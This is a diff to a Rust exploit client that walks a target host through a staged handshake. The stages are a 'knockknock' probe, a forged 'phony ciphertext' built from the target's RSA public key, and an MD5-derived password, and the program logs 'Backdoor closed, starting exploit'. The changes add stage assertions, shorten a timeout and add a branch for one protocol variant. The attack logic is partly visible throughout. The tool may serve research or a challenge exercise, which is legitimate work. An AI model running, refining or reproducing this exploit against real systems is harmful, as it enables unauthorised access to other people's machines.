@@ -29,7 +29,7 @@ const ANSI_WHITE: &str = "\x1b[97m";
 
 
 
-#[derive(Parser, Debug)]
+#[derive(Parser,Debug,Eq,PartialEq)]
 enum Protocol {
     Protocol1,
     Protocol2,
@@ -231,8 +231,8 @@ fn communicate(addr: &str, port: u16, data: &[u8], await_reply: bool) -> std::io
     if await_reply {
         // wait a tiny bit
         sleep(Duration::from_millis(10));
-        // set a timeout of 3 seconds
-        socket.set_read_timeout(Some(Duration::new(3, 0)))?;
+        // set a timeout of 1 second
+        socket.set_read_timeout(Some(Duration::new(1, 0)))?;
         let len = socket.recv(&mut buf)?;
         buf.truncate(len);
         return Ok(buf); 
@@ -257,6 +257,7 @@ fn probe_tcp_port(addr: &str, port: u16) -> bool {
 
 fn stage1(ctx: &mut Context) -> std::io::Result<u8> {
     trace!("Entering Stage 1");
+    assert!(ctx.stage == 1 && ctx.protocol == Protocol::Protocol3);
     let data = ctx.knockknock.as_ref().unwrap().as_bytes();
     let id = communicate(&ctx.address, ctx.port, &data, true)?;
 
@@ -277,6 +278,7 @@ fn stage1(ctx: &mut Context) -> std::io::Result<u8> {
 
 fn stage2(ctx: &Context) -> std::io::Result<u8> {
     trace!("Entering Stage 2");
+    assert!(ctx.stage == 2);
     if ctx.e.is_none() || ctx.n.is_none() {
         panic!("No public key available");
     }
@@ -300,13 +302,19 @@ fn stage2(ctx: &Context) -> std::io::Result<u8> {
 
     let ciphertext = find_phony_ciphertext(&rsa, &predicate);
     trace!("Found phony ciphertext: {}", hexdump(&ciphertext));
+
+    if ctx.protocol == Protocol::Protocol1 {
+        communicate(&ctx.address, ctx.port, &ciphertext, false)?;
+        return Ok(3);
+    } 
+    
     let challenge = communicate(&ctx.address, ctx.port, &ciphertext, true)?;
     if challenge.len() != 0x80 {
         warn!("Unexpected challenge length: {}", challenge.len());
         match ctx.protocol {
-            Protocol::Protocol1 => return Ok(2),
             Protocol::Protocol2 => return Ok(2),
-            Protocol::Protocol3 => return Ok(1)
+            Protocol::Protocol3 => return Ok(1),
+            _ => panic!("Should be unreachable, this is a bug!"),
         }
     }
     trace!("Received challenge: {}", hexdump(&challenge));
@@ -316,6 +324,7 @@ fn stage2(ctx: &Context) -> std::io::Result<u8> {
 
 fn stage3(ctx: &Context) -> std::io::Result<u8> {
     trace!("Entering Stage 3");
+    assert!(ctx.stage == 3);
     let password = md5(format!("+{}", ctx.salt).as_bytes());
     trace!("Password prepared: {}", hexdump(&password));
     let _res = communicate(&ctx.address, ctx.port, &password, false)?;
@@ -434,6 +443,7 @@ fn main() {
     info!("Backdoor closed, starting exploit");
 
     loop {
+        sleep(Duration::from_millis(100));
         match state_machine(&mut ctx) {
             Ok(_) => {
                 info!("Finished.");
